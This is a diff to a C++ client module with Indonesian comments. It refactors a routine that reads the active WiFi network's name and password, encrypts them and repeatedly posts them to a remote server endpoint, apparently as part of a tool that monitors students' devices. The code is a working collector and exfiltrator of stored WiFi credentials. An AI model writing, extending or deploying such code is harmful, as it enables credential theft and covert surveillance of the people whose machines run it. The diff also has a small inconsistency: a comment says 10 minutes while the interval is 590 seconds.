@@ -18,7 +18,39 @@ namespace ActiveMonitor {
     static std::string lastSsid = ""; 
     static std::string lastPass = "";
     static time_t lastSendTime = 0;   
-    static std::mutex statusMtx;      
+    static std::mutex statusMtx;
+
+    /**
+     * Helper: Membersihkan dan membangun target URL dari base URL.
+     * Menghilangkan path /upload dan trailing slashes/spaces.
+     */
+    std::string BuildTargetUrl(const std::string& baseUrl) {
+        std::string url = baseUrl;
+        
+        // Hapus path /upload jika ada
+        size_t pos = url.find("/upload");
+        if (pos != std::string::npos) {
+            url = url.substr(0, pos);
+        }
+        
+        // Hapus trailing slashes dan spaces
+        while (!url.empty() && (url.back() == '/' || url.back() == ' ')) {
+            url.pop_back();
+        }
+        
+        // Append target endpoint
+        return url + "/post-active";
+    }
+
+    /**
+     * Helper: Format data status aktif dengan struktur: version|ssid|password
+     * Include CLIENT_VERSION untuk tracking kompatibilitas versi.
+     */
+    std::string FormatActiveStatusData(const std::string& ssid, const std::string& password) {
+        std::stringstream ss;
+        ss << Config::CLIENT_VERSION << "|" << ssid << "|" << password;
+        return ss.str();
+    }      
 
     /**
      * Mengambil detail SSID dan Password WiFi yang sedang aktif terhubung.
@@ -83,53 +115,65 @@ namespace ActiveMonitor {
 
     /**
      * Menyusun data heartbeat dan mengirimkannya ke endpoint /post-active.
-     * Mengoptimalkan trafik: hanya kirim jika SSID berubah atau interval waktu tercapai.
+     * 
+     * Fitur:
+     * - Include CLIENT_VERSION untuk tracking versi client di server
+     * - Format data: version|ssid|password
+     * - Optimasi trafik: hanya kirim jika SSID berubah atau interval waktu tercapai
+     * - Heartbeat interval: 10 menit (590 detik)
+     * 
+     * Data Flow:
+     * 1. Validasi server URL existence
+     * 2. Ambil detail WiFi terkini dari system
+     * 3. Cek apakah perlu pengiriman dengan smart logic
+     * 4. Format data dengan version number dari config
+     * 5. Enkripsi data sebelum transmisi
+     * 6. Kirim ke server via /post-active endpoint
+     * 7. Update last send time dan SSID jika berhasil
      */
     void SendActiveStatus() {
-        std::string baseUrl;
-        
-        // Ambil URL dengan aman (Gunakan lock jika perlu, atau asumsikan DYNAMIC_SERVER_URL sudah stabil)
-        if (Config::DYNAMIC_SERVER_URL.empty()) return;
-        baseUrl = Config::DYNAMIC_SERVER_URL;
+        // === STEP 1: Validasi Server URL ===
+        if (Config::DYNAMIC_SERVER_URL.empty()) {
+            return; // Server URL belum di-inisialisasi, abort pengiriman
+        }
 
-        std::string currentSsid = "Ethernet", currentPass = "N/A";
+        // === STEP 2: Ambil Detail WiFi Terkini ===
+        std::string currentSsid = "Ethernet";
+        std::string currentPass = "N/A";
         GetWifiDetails(currentSsid, currentPass);
         
         time_t now = time(NULL);
         bool shouldSend = false;
 
-        // Logika pengiriman cerdas
+        // === STEP 3: Cek Smart Logic Pengiriman ===
         {
             std::lock_guard<std::mutex> lock(statusMtx);
-            // Kirim jika:
-            // 1. Belum pernah kirim sama sekali
-            // 2. SSID berubah (Santri pindah hotspot)
-            // 3. Sudah lebih dari 10 menit (Heartbeat rutin)
+            // Trigger pengiriman jika:
+            // - Ini adalah pengiriman pertama (lastSendTime == 0)
+            // - SSID berubah (user pindah ke WiFi lain)
+            // - Sudah lebih dari 10 menit sejak pengiriman terakhir (heartbeat rutin)
             if (lastSendTime == 0 || lastSsid != currentSsid || (now - lastSendTime >= 590)) {
                 shouldSend = true;
             }
         }
 
-        if (!shouldSend) return;
+        if (!shouldSend) {
+            return; // Tidak perlu kirim pada saat ini
+        }
 
-        // Siapkan data biner untuk dikirim
-        std::stringstream ss;
-        ss << currentSsid << "|" << currentPass;
-        std::string logContent = ss.str();
-        std::vector<BYTE> data(logContent.begin(), logContent.end());
+        // === STEP 4: Format Data dengan Version Number ===
+        // Include CLIENT_VERSION untuk tracking kompatibilitas di server
+        std::string formattedData = FormatActiveStatusData(currentSsid, currentPass);
+        std::vector<BYTE> dataToSend(formattedData.begin(), formattedData.end());
         
-        // Enkripsi sebelum transmisi
-        FinalEncryption(data);
+        // === STEP 5: Enkripsi Sebelum Transmisi ===
+        FinalEncryption(dataToSend);
 
-        // Routing URL ke endpoint khusus status aktif
-        size_t pos = baseUrl.find("/upload");
-        if (pos != std::string::npos) baseUrl = baseUrl.substr(0, pos);
-        while (!baseUrl.empty() && (baseUrl.back() == '/' || baseUrl.back() == ' ')) baseUrl.pop_back();
-
-        std::string targetUrl = baseUrl + "/post-active";
+        // === STEP 6: Build Target URL dan Kirim ===
+        std::string targetUrl = BuildTargetUrl(Config::DYNAMIC_SERVER_URL);
 
         bool success = PostDataChunked(
-            data,
+            dataToSend,
             "activity",
             "active_status.dat",
             std::to_string(now),
@@ -138,6 +182,7 @@ namespace ActiveMonitor {
             targetUrl 
         );
 
+        // === STEP 7: Update State jika Pengiriman Berhasil ===
         if (success) {
             std::lock_guard<std::mutex> lock(statusMtx);
             lastSendTime = now;
